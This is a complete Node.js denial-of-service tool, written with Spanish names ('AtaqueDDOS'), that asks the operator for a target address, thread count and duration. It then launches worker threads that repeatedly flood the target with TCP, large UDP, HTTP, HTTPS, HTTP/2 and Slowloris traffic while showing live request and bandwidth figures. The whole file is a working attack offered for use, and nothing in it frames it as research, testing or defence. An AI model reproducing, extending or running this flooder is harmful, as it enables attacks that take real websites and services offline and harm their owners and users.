#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const url = require('url');
const dns = require('dns/promises');

class AtaqueDDOS {
    constructor() {
        this.estadisticas = { total: 0, exitosas: 0, fallidas: 0, anchoBanda: 0 };
        this.trabajadores = [];
        this.metodos = ['TCP','UDP','HTTP','HTTPS','HTTP2','SLOWLORIS'];
    }

    async iniciar() {
        const objetivo = await this.preguntar(chalk.greenBright('Objetivo (URL/IP): '));
        const { hostname, puerto } = await this.parsearObjetivo(objetivo);
        const hilos = await this.numeroEntre(chalk.greenBright('Hilos (100-1000): '), 100, 1000);
        const duracion = await this.numeroEntre(chalk.greenBright('Duración (segundos): '), 10, 3600);
        
        this.tiempoInicio = performance.now();
        this.iniciarTrabajadores(hostname, puerto, hilos);
        this.mostrarEstadisticas();
        setTimeout(() => this.detener(), duracion * 1000);
    }

    async parsearObjetivo(entrada) {
        try {
            if (net.isIP(entrada)) {
                return { hostname: entrada, puerto: 80 };
            }

            if (!entrada.includes('://')) entrada = 'http://' + entrada;
            
            const urlObj = new url.URL(entrada);
            const dnsResuelto = await dns.lookup(urlObj.hostname);
            
            return {
                hostname: dnsResuelto.address,
                puerto: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80)
            };
        } catch (error) {
            console.error(chalk.red('\nError: Objetivo inválido'));
            console.log(chalk.yellow('Ejemplos válidos:'));
            console.log(chalk.yellow('- http://example.com'));
            console.log(chalk.yellow('- 192.168.1.1'));
            console.log(chalk.yellow('- google.com:8080\n'));
            process.exit(1);
        }
    }

    iniciarTrabajadores(objetivo, puerto, hilos) {
        const nucleos = Math.min(require('os').cpus().length, 16);
        const cargas = this.generarCargas(objetivo);
        
        for (let i = 0; i < nucleos; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    objetivo,
                    puerto,
                    cargas,
                    metodos: this.metodos,
                    intensidad: Math.ceil(hilos/nucleos) * 3
                }
            });

            worker.on('message', msg => this.actualizarEstadisticas(msg));
            this.trabajadores.push(worker);
        }
    }

    generarCargas(objetivo) {
        const crearCarga = tamaño => {
            const buf = Buffer.alloc(tamaño);
            randomFillSync(buf);
            return buf;
        };

        return {
            tcp: crearCarga(1024),
            udp: crearCarga(65507),
            http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${objetivo}\r\n\r\n`
        };
    }

    actualizarEstadisticas({ total, exitosas, fallidas, anchoBanda }) {
        this.estadisticas.total += total;
        this.estadisticas.exitosas += exitosas;
        this.estadisticas.fallidas += fallidas;
        this.estadisticas.anchoBanda += anchoBanda;
    }

    mostrarEstadisticas() {
        if (!this.tiempoInicio) return;
        
        const transcurrido = (performance.now() - this.tiempoInicio) / 1000;
        const rps = (this.estadisticas.total / transcurrido || 0).toFixed(0);
        const bw = (this.estadisticas.anchoBanda / 1024 ** 3).toFixed(3);

        process.stdout.write(
            chalk`\r{cyan [${transcurrido.toFixed(1)}s]} ` +
            chalk`{white Peticiones:} {cyan ${this.estadisticas.total}} ` +
            chalk`{green Éxito:} {cyan ${this.estadisticas.exitosas}} ` +
            chalk`{red Fallo:} {cyan ${this.estadisticas.fallidas}} ` +
            chalk`{yellow RPS:} {cyan ${rps}} ` +
            chalk`{magenta BW:} {cyan ${bw}GB}`
        );

        setTimeout(() => this.mostrarEstadisticas(), 250);
    }

    async preguntar(pregunta) {
        return new Promise(resolve => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            rl.question(pregunta, respuesta => {
                rl.close();
                resolve(respuesta);
            });
        });
    }

    async numeroEntre(pregunta, min, max) {
        let num;
        do {
            num = parseInt(await this.preguntar(pregunta)) || min;
        } while (num < min || num > max);
        return num;
    }

    detener() {
        this.trabajadores.forEach(w => w.terminate());
        console.log(chalk.red('\n\nAtaque detenido'));
        process.exit();
    }
}

if (isMainThread) {
    new AtaqueDDOS().iniciar();
} else {
    const { objetivo, puerto, cargas, metodos, intensidad } = workerData;
    const conexionesActivas = new Set();

    const metodosAtaque = {
        TCP: () => {
            const socket = net.connect(puerto, objetivo, () => {
                socket.write(cargas.tcp);
                socket.write(cargas.tcp);
                reportar('exito', cargas.tcp.length * 2);
                socket.end();
            });
            socket.on('error', () => reportar('fallo', 0));
        },

        UDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(cargas.udp, puerto, objetivo, err => {
                err ? reportar('fallo', 0) : reportar('exito', cargas.udp.length);
                socket.close();
            });
        },

        HTTP: () => {
            const req = http.get(`http://${objetivo}:${puerto}`, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Accept-Language': 'es-ES,es;q=0.9'
                }
            }, () => reportar('exito', 0));
            req.on('error', () => reportar('fallo', 0));
        },

        HTTPS: () => {
            const req = https.get(`https://${objetivo}:${puerto}`, {
                rejectUnauthorized: false,
                headers: {
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive'
                }
            }, () => reportar('exito', 0));
            req.on('error', () => reportar('fallo', 0));
        },

        HTTP2: () => {
            const cliente = http2.connect(`https://${objetivo}:${puerto}`, { rejectUnauthorized: false });
            const peticion = cliente.request({ ':path': '/', ':method': 'GET' });
            peticion.on('data', () => {});
            peticion.on('end', () => {
                reportar('exito', 0);
                cliente.close();
            });
            peticion.on('error', () => reportar('fallo', 0));
        },

        SLOWLORIS: () => {
            const socket = net.connect(puerto, objetivo);
            socket.write('GET / HTTP/1.1\r\nHost: ' + objetivo + '\r\n');
            socket.write('User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0)\r\n');
            conexionesActivas.add(socket);
            socket.on('error', () => conexionesActivas.delete(socket));
        }
    };

    function reportar(estado, bytes) {
        parentPort.postMessage({
            total: 1,
            exitosas: estado === 'exito' ? 1 : 0,
            fallidas: estado === 'fallo' ? 1 : 0,
            anchoBanda: bytes
        });
    }

    setInterval(() => {
        for (let i = 0; i < intensidad; i++) {
            metodos.forEach(metodo => {
                try {
                    metodosAtaque[metodo]();
                    metodosAtaque[metodo]();
                } catch {
                    reportar('fallo', 0);
                }
            });
        }
    }, 50);
}